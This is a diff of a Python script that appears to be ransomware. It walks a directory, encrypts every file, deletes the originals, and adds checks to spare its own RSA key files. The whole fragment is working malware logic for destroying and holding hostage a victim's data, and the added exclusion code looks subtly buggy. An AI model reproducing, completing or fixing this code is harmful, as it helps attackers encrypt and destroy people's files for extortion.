@@ -80,13 +80,19 @@ def decrypt_file(infile, outfile):
 def encrypt_all_files(rootdir):
     for dirName, subdirList, fileList in walk(rootdir):
         for file in fileList:
-
             try:
-
-                # TODO Exclude public key, private key, executable
-
                 filePath = path.join(dirName, file)
                 encrypt_file(filePath, filePath + constants.ENCRYPTED_EXTENSION)
+
+                # Exclude public key
+                if path.abspath(filePath) == path.abspath(constants.RSA_PUBLICKEY_FILEPATH):
+                    break
+
+                # Exclude private key
+                if path.abspath(filePath) == path.abspath(constants.RSA_PRIVATEKEY_FILEPATH):
+                    break
+
+                # Executable will be excluded by default because it's running
 
                 remove(filePath)
 
